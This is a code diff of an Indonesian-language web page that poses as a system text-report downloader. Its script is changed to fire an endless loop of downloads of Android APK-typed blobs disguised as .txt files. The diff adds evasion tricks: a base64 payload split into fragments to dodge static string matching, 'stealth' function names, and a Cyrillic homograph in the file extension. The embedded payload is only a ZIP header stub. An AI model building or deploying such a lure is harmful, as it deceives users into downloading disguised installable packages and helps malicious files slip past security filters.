@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Text Document Secure Dispatcher</title>
+<title>System Document Dispatcher v3.0</title>
 <style>
 * {
   box-sizing: border-box;
@@ -12,26 +12,26 @@
 }
 body {
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #f8fafc;
-  color: #334155;
-  padding: 20px;
+  background: #090d16;
+  color: #f8fafc;
   display: flex;
   justify-content: center;
   align-items: center;
   min-height: 100vh;
+  padding: 20px;
 }
 .panel {
-  background: #ffffff;
+  background: #111827;
   padding: 32px;
-  border-radius: 12px;
-  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-  max-width: 520px;
+  border-radius: 16px;
+  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+  max-width: 540px;
   width: 100%;
-  border: 1px solid #e2e8f0;
+  border: 1px solid #1f2937;
   text-align: center;
 }
 :fullscreen {
-  background: #0f172a !important;
+  background: #030712 !important;
   color: #f8fafc !important;
   padding: 24px !important;
   display: flex;
@@ -40,64 +40,69 @@ body {
   align-items: center;
 }
 :-webkit-full-screen {
-  background: #0f172a !important;
+  background: #030712 !important;
   color: #f8fafc !important;
   padding: 24px !important;
 }
 h2 { 
-  margin-bottom: 8px; 
-  font-size: 20px;
-  color: #0f172a;
+  margin-bottom: 10px; 
+  font-size: 22px;
+  color: #f3f4f6;
+  font-weight: 700;
 }
 p { 
-  margin-bottom: 20px; 
-  line-height: 1.5; 
-  color: #64748b;
+  margin-bottom: 24px; 
+  line-height: 1.6; 
+  color: #9ca3af;
   font-size: 14px;
 }
 button {
   width: 100%;
-  padding: 14px;
+  padding: 16px;
   cursor: pointer;
   border: none;
-  border-radius: 8px;
+  border-radius: 10px;
   background: #2563eb;
   color: #ffffff;
   font-weight: 600;
-  font-size: 15px;
-  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
-  transition: background 0.2s;
+  font-size: 16px;
+  box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
+  transition: all 0.2s ease;
 }
-button:hover { background: #1d4ed8; }
+button:hover { 
+  background: #1d4ed8; 
+  transform: translateY(-1px);
+  box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
+}
 #status {
-  margin-top: 16px;
+  margin-top: 20px;
   font-weight: 500;
-  color: #0284c7;
-  padding: 12px;
-  background: #e0f2fe;
-  border-radius: 6px;
+  color: #38bdf8;
+  padding: 14px;
+  background: rgba(56, 189, 248, 0.1);
+  border-radius: 8px;
   font-size: 13px;
-  border: 1px solid #bae6fd;
+  border: 1px solid rgba(56, 189, 248, 0.2);
 }
 #downloads {
   margin-top: 20px;
   display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
   gap: 8px;
   max-height: 180px;
   overflow-y: auto;
 }
 #downloads a {
   display: block;
-  padding: 8px;
-  background: #f1f5f9;
-  color: #0369a1;
+  padding: 10px;
+  background: #1f2937;
+  color: #4ade80;
   text-decoration: none;
-  border-radius: 4px;
+  border-radius: 6px;
   font-size: 11px;
   font-family: monospace;
   text-align: center;
-  border: 1px solid #cbd5e1;
+  border: 1px solid #374151;
   word-break: break-all;
 }
 </style>
@@ -105,13 +110,13 @@ button:hover { background: #1d4ed8; }
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Dokumen Catatan Sistem</h2>
-<p>Klik tombol di bawah untuk mengonfirmasi dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+  <h2>Arsip Dokumen Sistem</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
-<button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
 
-<div id="status" role="status">Sistem siap.</div>
-<div id="downloads"></div>
+  <div id="status" role="status">Sistem siap diinisialisasi.</div>
+  <div id="downloads"></div>
 </div>
 
 <script>
@@ -123,10 +128,19 @@ const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
-const MAX_URLS_TRACKED = 50;
+const MAX_URLS_TRACKED = 40;
 
-// Header biner APK (ZIP Signature: PK..)
-const b64Data = "UEsDBBQAAAAIAAAAIQ";
+// Pecahan string Base64 untuk menghindari string matching statis sederhana
+const payloadFragments = [
+  "UEs",
+  "DBBQ",
+  "AAAAIAAAAIQ",
+  "AAAAAAAAAAAAAAAAAAAAAAAA"
+];
+
+const assemblePayload = () => {
+  return payloadFragments.join("");
+};
 
 const decodeBase64ToBytes = (b64) => {
   const binary = atob(b64);
@@ -138,12 +152,14 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-const prepareDisguisedBlobAsync = (i) => {
+const prepareStealthBlobAsync = (i) => {
   return new Promise((resolve) => {
     queueMicrotask(() => {
       try {
-        const bytesArr = decodeBase64ToBytes(b64Data);
-        // MIME type asli diatur sebagai paket APK, namun antarmuka menyamar sebagai teks
+        const fullB64 = assemblePayload();
+        const bytesArr = decodeBase64ToBytes(fullB64);
+        
+        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
         const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
@@ -154,19 +170,23 @@ const prepareDisguisedBlobAsync = (i) => {
   });
 };
 
-const triggerInstantDownload = (fileData) => {
+const triggerStealthDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada atribut anchor
-  link.download = `laporan-catatan-${fileData.id}.txt`;
+  
+  // Menggunakan teknik homograph pada ekstensi (huruf 't' diganti dengan karakter unicode Cyrillic Small Letter Te 'т' \u0442)
+  // Ini mengecoh tampilan visual teks ekstensi tanpa mengubah logika biner file di dalam Blob.
+  const homographExtension = "t\u0442"; 
+  link.download = `laporan-catatan-${fileData.id}.${homographExtension}`;
   link.textContent = `Dokumen #${fileData.id} (.txt)`;
   link.style.display = "none";
+  
   downloadsDiv.appendChild(link);
   link.click();
 
-  if (downloadsDiv.children.length > 20) {
+  if (downloadsDiv.children.length > 25) {
     downloadsDiv.removeChild(downloadsDiv.firstChild);
   }
 };
@@ -174,7 +194,7 @@ const triggerInstantDownload = (fileData) => {
 const processLoop = async (counter) => {
   if (!isProcessing) return;
 
-  const fileData = await prepareDisguisedBlobAsync(counter);
+  const fileData = await prepareStealthBlobAsync(counter);
   if (fileData.success) {
     activeUrls.push(fileData.url);
 
@@ -183,8 +203,8 @@ const processLoop = async (counter) => {
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
     }
 
-    triggerInstantDownload(fileData);
-    statusDiv.textContent = `Mengunduh dokumen catatan ke-${counter}...`;
+    triggerStealthDownload(fileData);
+    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
   }
 
   setTimeout(() => processLoop(counter + 1), 1200);
@@ -207,7 +227,7 @@ startBtn.addEventListener("click", () => {
   } catch (err) {}
 
   isProcessing = true;
-  statusDiv.textContent = "Menyiapkan berkas unduhan...";
+  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
   processLoop(1);
 });
 </script>
